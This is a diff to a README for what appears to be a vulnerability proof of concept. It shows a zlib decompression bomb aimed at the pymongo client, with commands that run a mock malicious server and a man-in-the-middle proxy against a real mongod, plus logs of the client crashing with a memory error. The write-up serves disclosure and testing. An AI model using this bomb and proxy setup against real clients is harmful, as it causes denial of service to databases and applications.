@@ -36,12 +36,44 @@ in `mongoc-cluster.c`) — `pymongo` has no equivalent check anywhere.
   import zlib
   open('bomb_2gb.zlib','wb').write(zlib.compress(b'\x00' * 2_000_000_000, level=9))
   ```
+- `mitm_proxy.py` / `victim_client_real.py` — the same attack reproduced
+  against a **real, unmodified `mongod 8.3.8` binary** instead of the mock
+  server above (see next section), since a mock server proves the client-side
+  bug but not that a real deployment's negotiation is exploitable the same
+  way.
 
-## Running it
+## Running it (mock server)
 
 ```
 python3 evil_server.py <port> 2000000000 bomb_2gb.zlib &
 python3 victim_client.py <port>
+```
+
+## Running it against a real mongod (recommended — this is what was actually
+## used to validate the finding)
+
+```
+mongod --dbpath <dir> --port 27799 --bind_ip 127.0.0.1 --networkMessageCompressors zlib &
+python3 mitm_proxy.py 27801 27799 bomb_2gb.zlib 2000000000 &
+python3 victim_client_real.py 27801
+```
+
+`mitm_proxy.py` relays every byte untouched in both directions between
+`pymongo` and the real `mongod` — including the real handshake and hello
+negotiation — and substitutes exactly one reply (the real server's genuine
+reply to the client's first post-handshake command) with the zlib bomb. This
+models a compromised server or an on-path attacker tampering with an
+unencrypted connection, using a completely genuine `mongod` for everything
+else. Result, confirmed against `mongod` `v8.3.8` (`gitVersion
+35e8c8a57f78157ed9fac1a9e90ee6c1818adab6`):
+
+```
+[proxy#3] client->server op_code=2012 len=95: relaying untouched
+[proxy#3] server->client (REAL reply, len=47, op_code=2012) intercepted -- discarding it
+[proxy] *** SUBSTITUTING real reply with OP_COMPRESSED bomb *** wire_bytes=1943944 claimed_uncompressed=2000000000 (ratio 1029:1)
+...
+[client] EXCEPTION after ~5.84s: MemoryError: Unable to allocate output buffer.
+[client] peak RSS observed: 1.07 GiB (1126520 KB)
 ```
 
 Or, to see the effect in complete isolation (no networking, no pymongo
